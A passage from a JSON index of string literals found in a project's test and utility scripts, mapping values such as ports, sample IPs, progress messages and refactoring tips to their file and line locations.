    },
    "1. VERIFY which database should be used:": {
      "value": "1. VERIFY which database should be used:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:120"
      ]
    },
    "1. Validating configuration...": {
      "value": "1. Validating configuration...",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:32",
        "scripts/test_database_url_builder_comprehensive.py:89"
      ]
    },
    "1. `": {
      "value": "1. `",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:591"
      ]
    },
    "1.1.1.1,": {
      "value": "1.1.1.1,",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:696"
      ]
    },
    "1.5s": {
      "value": "1.5s",
      "category": "test_literals",
      "locations": [
        "frontend/components/chat/ConnectionStatusIndicator.test.tsx:40"
      ]
    },
    "10": {
      "value": "10",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_env.py:59",
        "scripts/test_ssl_certificates_staging.py:185",
        "scripts/unified_test_runner.py:912"
      ]
    },
    "12": {
      "value": "12",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:916"
      ]
    },
    "123": {
      "value": "123",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:273",
        "auth_service/tests/test_critical_oauth_environment_failures.py:256",
        "auth_service/tests/test_five_whys_reproduction.py:106",
        "auth_service/tests/test_five_whys_reproduction.py:140",
        "auth_service/tests/test_security.py:137",
        "auth_service/tests/test_security.py:185",
        "auth_service/tests/test_security.py:251",
        "auth_service/tests/test_security.py:281",
        "auth_service/tests/test_security.py:353",
        "auth_service/tests/test_security.py:434"
      ]
    },
    "123456": {
      "value": "123456",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status.py:155"
      ]
    },
    "12345678": {
      "value": "12345678",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:298"
      ]
    },
    "123456789": {
      "value": "123456789",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_state_csrf_vulnerability.py:82",
        "scripts/test_staging_config.py:43"
      ]
    },
    "1234567890": {
      "value": "1234567890",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_oauth_id_token_validation.py:41",
        "auth_service/tests/test_oauth_id_token_validation.py:73"
      ]
    },
    "1234567890123456": {
      "value": "1234567890123456",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:301"
      ]
    },
    "127.0.0.1": {
      "value": "127.0.0.1",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_settings.py:71",
        "scripts/test_ssl_certificates_staging.py:115"
      ]
    },
    "13/15": {
      "value": "13/15",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_postgres_compliance.py:174"
      ]
    },
    "15": {
      "value": "15",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_env.py:24",
        "auth_service/tests/config/test_env.py:35",
        "scripts/test_discovery_report.py:106",
        "scripts/test_discovery_report.py:108",
        "scripts/unified_test_runner.py:701",
        "scripts/unified_test_runner.py:701",
        "scripts/unified_test_runner.py:881"
      ]
    },
    "192.168.1.1": {
      "value": "192.168.1.1",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_management.py:290",
        "auth_service/tests/test_session_management.py:298",
        "auth_service/tests/test_session_management.py:338",
        "auth_service/tests/test_session_management.py:347"
      ]
    },
    "192.168.1.100": {
      "value": "192.168.1.100",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:560"
      ]
    },
    "1h 1m": {
      "value": "1h 1m",
      "category": "test_literals",
      "locations": [
        "frontend/components/chat/ConnectionStatusIndicator.test.tsx:34"
      ]
    },
    "1m 30s": {
      "value": "1m 30s",
      "category": "test_literals",
      "locations": [
        "frontend/components/chat/ConnectionStatusIndicator.test.tsx:33"
      ]
    },
    "2. **Extract Shared Utilities** - Move common mocks to test/fixtures directory": {
      "value": "2. **Extract Shared Utilities** - Move common mocks to test/fixtures directory",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:565"
      ]
    },
    "2. Building database URL...": {
      "value": "2. Building database URL...",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:237"
      ]
    },
    "2. Building database URLs using DatabaseURLBuilder...": {
      "value": "2. Building database URLs using DatabaseURLBuilder...",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_db_direct.py:51"
      ]
    },
    "2. Building database URLs...": {
      "value": "2. Building database URLs...",
      "category": "test_literals",
      "locations": [
        "scripts/test_ssl_certificates_staging.py:221"
      ]
    },
    "2. Building migration URLs...": {
      "value": "2. Building migration URLs...",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_migrations.py:50"
      ]
    },
    "2. Check git status: git status": {
      "value": "2. Check git status: git status",
      "category": "test_literals",
      "locations": [
        "scripts/standardize_l3_test_names.py:294"
      ]
    },
    "2. Checking DatabaseManager methods...": {
      "value": "2. Checking DatabaseManager methods...",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:39"
      ]
    },
    "2. Delete the violating conftest.py files": {
      "value": "2. Delete the violating conftest.py files",
      "category": "test_literals",
      "locations": [
        "scripts/check_conftest_violations.py:91"
      ]
    },
    "2. Different access patterns...": {
      "value": "2. Different access patterns...",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:277"
      ]
    },
    "2. Full real e2e test (with actual LLM):": {
      "value": "2. Full real e2e test (with actual LLM):",
      "category": "test_literals",
      "locations": [
        "scripts/test_discovery_report.py:154"
      ]
    },
    "2. Large file splitting": {
      "value": "2. Large file splitting",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_fixer.py:383"
      ]
    },
    "2. Look for circular imports in the error messages above": {
      "value": "2. Look for circular imports in the error messages above",
      "category": "test_literals",
      "locations": [
        "scripts/test_imports.py:110"
      ]
    },
    "2. Manually refactor files with violations": {
      "value": "2. Manually refactor files with violations",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:1019"
      ]
    },
    "2. Migration URL safety...": {
      "value": "2. Migration URL safety...",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_migrations.py:193"
      ]
    },
    "2. Missing auth service tables in the 'postgres' database": {
      "value": "2. Missing auth service tables in the 'postgres' database",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:176"
      ]
    },
    "2. PROPER FIX: Create 'netra_staging' database for staging environment": {
      "value": "2. PROPER FIX: Create 'netra_staging' database for staging environment",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:104"
      ]
    },
    "2. Replace test stubs with real implementations": {
      "value": "2. Replace test stubs with real implementations",
      "category": "test_literals",
      "locations": [
        "scripts/ci/check_test_stubs.py:86"
      ]
    },
    "2. Run mock-only tests: pytest -m mock_only": {
      "value": "2. Run mock-only tests: pytest -m mock_only",
      "category": "test_literals",
      "locations": [
        "scripts/add_test_markers.py:243"
      ]
    },
    "2. Set GOOGLE_CLIENT_SECRET in .env file": {
      "value": "2. Set GOOGLE_CLIENT_SECRET in .env file",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:401"
      ]
    },
    "2. Split by functionality being tested": {
      "value": "2. Split by functionality being tested",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_limits_checker.py:196"
      ]
    },
    "2. Split by test classes:": {
      "value": "2. Split by test classes:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:376"
      ]
    },
    "2. Split into multiple focused test cases": {
      "value": "2. Split into multiple focused test cases",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_limits_checker.py:212"
      ]
    },
    "2. Test Refactoring Helper - suggests splits": {
      "value": "2. Test Refactoring Helper - suggests splits",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:206"
      ]
    },
    "2. Test Refactoring Helper:": {
      "value": "2. Test Refactoring Helper:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:184"
      ]
    },
    "2. Test functions MUST be ≤8 lines (SPEC/testing.xml)": {
      "value": "2. Test functions MUST be ≤8 lines (SPEC/testing.xml)",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_limits_examples.py:266"
      ]
    },
    "2. Testing Alembic dry run...": {
      "value": "2. Testing Alembic dry run...",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_migrations.py:136"
      ]
    },
    "2. Testing Cloud SQL detection...": {
      "value": "2. Testing Cloud SQL detection...",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:40"
      ]
    },
    "2. Testing SSL connection...": {
      "value": "2. Testing SSL connection...",
      "category": "test_literals",
      "locations": [
        "scripts/test_ssl_certificates_staging.py:64"
      ]
    },
    "2. Testing TCP detection...": {
      "value": "2. Testing TCP detection...",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:96"
      ]
    },
    "2. Testing URL validation methods...": {
      "value": "2. Testing URL validation methods...",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:329"
      ]
    },
    "2. Testing command generation...": {
      "value": "2. Testing command generation...",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_startup_integration.py:282"
      ]
    },
    "2. Testing invalid URLs...": {
      "value": "2. Testing invalid URLs...",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:188"
      ]
    },
    "2. Testing migration commands...": {
      "value": "2. Testing migration commands...",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_migrations.py:242"
      ]
    },
    "2. Tests expecting specific implementation details that have changed": {
      "value": "2. Tests expecting specific implementation details that have changed",
      "category": "test_literals",
      "locations": [
        "scripts/fix_common_test_issues.py:77"
      ]
    },
    "2. UPDATE Secret Manager if needed:": {
      "value": "2. UPDATE Secret Manager if needed:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:124"
      ]
    },
    "2. Use dry-run mode to preview changes": {
      "value": "2. Use dry-run mode to preview changes",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:953"
      ]
    },
    "2.0": {
      "value": "2.0",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:96"
      ]
    },
    "20": {
      "value": "20",
      "category": "test_literals",
      "locations": [
        "scripts/test_discovery_report.py:93",
        "scripts/test_discovery_report.py:95"
      ]
    },
    "2025-08-24T00:00:00Z": {
      "value": "2025-08-24T00:00:00Z",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_simple.py:24"
      ]
    },
    "2d": {
      "value": "2d",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_violations_reporter.py:83"
      ]
    },
    "3": {
      "value": "3",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:49",
        "scripts/test_failure_scanner.py:240"
      ]
    },
    "3. **Use Real Components** - Replace mocks with actual component instances": {
      "value": "3. **Use Real Components** - Replace mocks with actual component instances",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:566"
      ]
    },
    "3. Commit changes: git add . && git commit -m 'Standardize L3 test naming'": {
      "value": "3. Commit changes: git add . && git commit -m 'Standardize L3 test naming'",
      "category": "test_literals",
      "locations": [
        "scripts/standardize_l3_test_names.py:295"
      ]
    },
    "3. Extract assertion logic into helper methods": {
      "value": "3. Extract assertion logic into helper methods",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_limits_checker.py:213"
      ]
    },
    "3. Extract helper functions:": {
      "value": "3. Extract helper functions:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:382"
      ]
    },
    "3. Function size reduction": {
      "value": "3. Function size reduction",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_fixer.py:384"
      ]
    },
    "3. Integration tests running as unit tests": {
      "value": "3. Integration tests running as unit tests",
      "category": "test_literals",
      "locations": [
        "scripts/fix_common_test_issues.py:78"
      ]
    },
    "3. Manually refactor instead of using auto-fix": {
      "value": "3. Manually refactor instead of using auto-fix",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:954"
      ]
    },
    "3. Move test helpers to app/tests/ directory": {
      "value": "3. Move test helpers to app/tests/ directory",
      "category": "test_literals",
      "locations": [
        "scripts/ci/check_test_stubs.py:87"
      ]
    },
    "3. Need to run migrations or use correct staging database": {
      "value": "3. Need to run migrations or use correct staging database",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:177"
      ]
    },
    "3. RUN database migrations on correct database:": {
      "value": "3. RUN database migrations on correct database:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:127"
      ]
    },
    "3. Run real service tests: ENABLE_REAL_LLM_TESTING=true pytest -m real_services": {
      "value": "3. Run real service tests: ENABLE_REAL_LLM_TESTING=true pytest -m real_services",
      "category": "test_literals",
      "locations": [
        "scripts/add_test_markers.py:244"
      ]
    },
    "3. Safety considerations...": {
      "value": "3. Safety considerations...",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_migrations.py:256"
      ]
    },
    "3. Set JWT_SECRET_KEY in .env file (must match auth service)": {
      "value": "3. Set JWT_SECRET_KEY in .env file (must match auth service)",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:403"
      ]
    },
    "3. Split by functionality, test type, or scenario": {
      "value": "3. Split by functionality, test type, or scenario",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_limits_examples.py:267"
      ]
    },
    "3. Split by test class if using class-based tests": {
      "value": "3. Split by test class if using class-based tests",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_limits_checker.py:197"
      ]
    },
    "3. Test Runner Integration - pre-run validation": {
      "value": "3. Test Runner Integration - pre-run validation",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:207"
      ]
    },
    "3. Test Runner Integration:": {
      "value": "3. Test Runner Integration:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:190"
      ]
    },
    "3. Testing URL generation...": {
      "value": "3. Testing URL generation...",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:45",
        "scripts/test_database_url_builder_comprehensive.py:101"
      ]
    },
    "3. Testing URL normalization for migrations...": {
      "value": "3. Testing URL normalization for migrations...",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_migrations.py:65"
      ]
    },
    "3. Testing URL normalization...": {
      "value": "3. Testing URL normalization...",
      "category": "test_literals",
      "locations": [
        "scripts/test_ssl_certificates_staging.py:239"
      ]
    },
    "3. Testing async connection with asyncpg...": {
      "value": "3. Testing async connection with asyncpg...",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_db_direct.py:84"
      ]
    },
    "3. Testing auth service URL conversion...": {
      "value": "3. Testing auth service URL conversion...",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:244"
      ]
    },
    "3. Testing full startup integration...": {
      "value": "3. Testing full startup integration...",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_startup_integration.py:286"
      ]
    },
    "3. UPDATE: Secret Manager to use 'netra_staging' if that's the intended DB": {
      "value": "3. UPDATE: Secret Manager to use 'netra_staging' if that's the intended DB",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:105"
      ]
    },
    "3. Update test imports if necessary": {
      "value": "3. Update test imports if necessary",
      "category": "test_literals",
      "locations": [
        "scripts/check_conftest_violations.py:92"
      ]
    },
    "3. Use established patterns like fixtures and helper functions": {
      "value": "3. Use established patterns like fixtures and helper functions",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:1020"
      ]
    },
    "3. Verify all module files exist and have no syntax errors": {
      "value": "3. Verify all module files exist and have no syntax errors",
      "category": "test_literals",
      "locations": [
        "scripts/test_imports.py:111"
      ]
    },
    "3. With specific LLM model:": {
      "value": "3. With specific LLM model:",
      "category": "test_literals",
      "locations": [
        "scripts/test_discovery_report.py:157"
      ]
    },
    "3.5.2": {
      "value": "3.5.2",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:345"
      ]
    },
    "30": {
      "value": "30",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_startup_integration.py:63",
        "auth_service/tests/test_auth_startup_integration.py:258"
      ]
    },
    "300": {
      "value": "300",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_env.py:60"
      ]
    },
    "30s": {
      "value": "30s",
      "category": "test_literals",
      "locations": [
        "frontend/components/chat/ConnectionStatusIndicator.test.tsx:32",
        "scripts/test_example_message_flow.py:288",
        "scripts/test_example_message_flow.py:410"
      ]
    },
    "34.132.142.103": {
      "value": "34.132.142.103",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_authentication_failures.py:291",
        "auth_service/tests/test_database_authentication_failures.py:308",
        "auth_service/tests/test_staging_database_credentials.py:164"
      ]
    },
    "35.223": {
      "value": "35.223",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_issues.py:221"
      ]
    },
    "3d": {
      "value": "3d",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_violations_reporter.py:83"
      ]
    },
    "4": {
      "value": "4",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:228",
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:244",
        "scripts/test_discovery_report.py:106",
        "scripts/test_discovery_report.py:108",
        "scripts/test_discovery_report.py:115",
        "scripts/test_discovery_report.py:116",
        "scripts/test_discovery_report.py:117",
        "scripts/test_discovery_report.py:118",
        "scripts/test_discovery_report.py:121"
      ]
    },
    "4. **Mock External APIs Only** - Keep mocking limited to HTTP clients, databases": {
      "value": "4. **Mock External APIs Only** - Keep mocking limited to HTTP clients, databases",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:567"
      ]
    },
    "4. Check that __init__.py files exist in all package directories": {
      "value": "4. Check that __init__.py files exist in all package directories",
      "category": "test_literals",
      "locations": [
        "scripts/test_imports.py:112"
      ]
    },
    "4. Compliance Examples - properly sized tests": {
      "value": "4. Compliance Examples - properly sized tests",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:208"
      ]
    },
    "4. Extract common setup to fixtures or helper functions": {
      "value": "4. Extract common setup to fixtures or helper functions",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_limits_examples.py:268"
      ]
    },
    "4. Mock reduction in integration tests": {
      "value": "4. Mock reduction in integration tests",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_fixer.py:385"
      ]
    },
    "4. Move helper functions to separate test utilities module": {
      "value": "4. Move helper functions to separate test utilities module",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_limits_checker.py:198"
      ]
    },
    "4. Run 'python scripts/remove_test_stubs.py --scan' locally": {
      "value": "4. Run 'python scripts/remove_test_stubs.py --scan' locally",
      "category": "test_literals",
      "locations": [
        "scripts/ci/check_test_stubs.py:88"
      ]
    },
    "4. Run tests after each refactoring to ensure correctness": {
      "value": "4. Run tests after each refactoring to ensure correctness",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:1021"
      ]
    },
    "4. Split by feature being tested:": {
      "value": "4. Split by feature being tested:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:386"
      ]
    },
    "4. Start auth service: python -m auth_service.auth_core.main": {
      "value": "4. Start auth service: python -m auth_service.auth_core.main",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:407"
      ]
    },
    "4. TEST connection in staging environment:": {
      "value": "4. TEST connection in staging environment:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:131"
      ]
    },
    "4. Testing engine creation configuration...": {
      "value": "4. Testing engine creation configuration...",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:265"
      ]
    },
    "4. Testing environment-specific URL selection...": {
      "value": "4. Testing environment-specific URL selection...",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:52"
      ]
    },
    "4. Testing sync connection with psycopg2...": {
      "value": "4. Testing sync connection with psycopg2...",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_db_direct.py:100"
      ]
    },
    "4. Use parameterized tests for multiple scenarios": {
      "value": "4. Use parameterized tests for multiple scenarios",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_limits_checker.py:214"
      ]
    },
    "4. View Examples:": {
      "value": "4. View Examples:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:196"
      ]
    },
    "4d": {
      "value": "4d",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_violations_reporter.py:83"
      ]
    },
    "5": {
      "value": "5",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:174"
      ]
    },
    "5. **Split Large Functions** - Break down oversized test functions": {
      "value": "5. **Split Large Functions** - Break down oversized test functions",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:568"
      ]
    },
    "5. Debug information...": {
      "value": "5. Debug information...",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:59"
      ]
    },
    "5. Start backend service: python scripts/dev_launcher.py": {
      "value": "5. Start backend service: python scripts/dev_launcher.py",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:410"
      ]
    },
    "5. Use parameterized tests to reduce duplication": {
      "value": "5. Use parameterized tests to reduce duplication",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_limits_examples.py:269"
      ]
    },
    "5. VERIFY auth operations work end-to-end:": {
      "value": "5. VERIFY auth operations work end-to-end:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:135"
      ]
    },
    "50ms": {
      "value": "50ms",
      "category": "test_literals",
      "locations": [
        "frontend/components/chat/ConnectionStatusIndicator.test.tsx:39"
      ]
    },
    "5432": {
      "value": "5432",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:35",
        "auth_service/test_staging_db_connection.py:40",
        "auth_service/test_url_construction.py:36",
        "auth_service/tests/database/test_config.py:106",
        "auth_service/tests/database/test_config.py:118",
        "auth_service/tests/database/test_config.py:143",
        "auth_service/tests/test_critical_staging_database_failures.py:51",
        "auth_service/tests/test_critical_staging_database_failures.py:109",
        "auth_service/tests/test_critical_staging_database_failures.py:147",
        "auth_service/tests/test_critical_staging_database_failures.py:199"
      ]
    },
    "6": {
      "value": "6",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:271",
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:305",
        "scripts/cleanup_test_processes.py:108",
        "scripts/cleanup_test_processes.py:108",
        "scripts/cleanup_test_processes.py:166",
        "scripts/cleanup_test_processes.py:166"
      ]
    },
    "6. Check OAuth redirect configuration in backend": {
      "value": "6. Check OAuth redirect configuration in backend",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:414"
      ]
    },
    "6379": {
      "value": "6379",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_env.py:34"
      ]
    },
    "7": {
      "value": "7",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_env.py:25"
      ]
    },
    "7. Check token generation in auth service": {
      "value": "7. Check token generation in auth service",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:420"
      ]
    },
    "7. Enable dev login: Set ALLOW_DEV_LOGIN=true in .env": {
      "value": "7. Enable dev login: Set ALLOW_DEV_LOGIN=true in .env",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:418"
      ]
    },
    "8": {
      "value": "8",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:69",
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:99",
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:366",
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:387",
        "scripts/test_failure_scanner.py:240"
      ]
    },
    "8000": {
      "value": "8000",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:57"
      ]
    },
    "8080": {
      "value": "8080",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_issues.py:125",
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:98"
      ]
    },
    "8081": {
      "value": "8081",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_startup_integration.py:257",
        "auth_service/tests/test_auth_startup_integration.py:268"
      ]
    },
    "999999": {
      "value": "999999",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:352"
      ]
    },
    "999999999": {
      "value": "999999999",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status_corrected.py:150"
      ]
    },
    ":": {
      "value": ":",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/agents/test_agent_initialization.py:204",
        "auth_service/tests/database/test_config.py:110",
        "auth_service/tests/database/test_config.py:110",
        "auth_service/tests/database/test_config.py:122",
        "auth_service/tests/database/test_config.py:122",
        "auth_service/tests/database/test_config.py:147",
        "auth_service/tests/database/test_config.py:147",
        "auth_service/tests/factories/permission_factory.py:57",
        "auth_service/tests/factories/permission_factory.py:89",
        "auth_service/tests/factories/permission_factory.py:110"
      ]
    },
    ":\n    \"\"\"Comprehensive test suite for": {
      "value": ":\n    \"\"\"Comprehensive test suite for",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:121"
      ]
    },
    ":\n    \"\"\"Test suite for": {
      "value": ":\n    \"\"\"Test suite for",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:197"
      ]
    },
    ": '": {
      "value": ": '",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:411"
      ]
    },
    ": <not set>": {
      "value": ": <not set>",
      "category": "test_literals",
      "locations": [
        "scripts/test_config_loading.py:45"
      ]
    },
    ": Custom runner without ACT comment": {
      "value": ": Custom runner without ACT comment",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:238"
      ]
    },
    ": FAILED WITH EXCEPTION": {
      "value": ": FAILED WITH EXCEPTION",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:372",
        "scripts/test_database_url_builder_comprehensive.py:324",
        "scripts/test_ssl_certificates_staging.py:280",
        "scripts/test_staging_migrations.py:300"
      ]
    },
    ": Implement": {
      "value": ": Implement",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_batch.py:211"
      ]
    },
    ": MISSING - No API key": {
      "value": ": MISSING - No API key",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_config.py:115"
      ]
    },
    ": NOT AVAILABLE": {
      "value": ": NOT AVAILABLE",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:295"
      ]
    },
    ": No tests run": {
      "value": ": No tests run",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:343"
      ]
    },
    ": OK - API key configured (from": {
      "value": ": OK - API key configured (from",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_config.py:113"
      ]
    },
    ": expected": {
      "value": ": expected",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/test_mixins.py:38",
        "auth_service/tests/base/test_mixins.py:58",
        "auth_service/tests/utils/assertion_helpers.py:186",
        "auth_service/tests/utils/assertion_helpers.py:202"
      ]
    },
    ": got": {
      "value": ": got",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_postgres_compliance.py:223"
      ]
    },
    "://": {
      "value": "://",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_postgres_compliance.py:222",
        "scripts/test_config_loading.py:121"
      ]
    },
    "://***@": {
      "value": "://***@",
      "category": "test_literals",
      "locations": [
        "scripts/test_config_loading.py:121"
      ]
    },
    "::": {
      "value": "::",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:370",
        "scripts/analyze_test_overlap.py:371",
        "scripts/ci/check_test_stubs.py:100",
        "scripts/ci/check_test_stubs.py:100",
        "scripts/fix_test_batch.py:297",
        "scripts/iterative_test_fix_loop.py:71",
        "scripts/iterative_test_fix_loop.py:72",
        "scripts/test_backend_optimized.py:311",
        "scripts/test_backend_optimized.py:312",
        "scripts/test_example_message_flow.py:157"
      ]
    },
    "<": {
      "value": "<",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:366"
      ]
    },
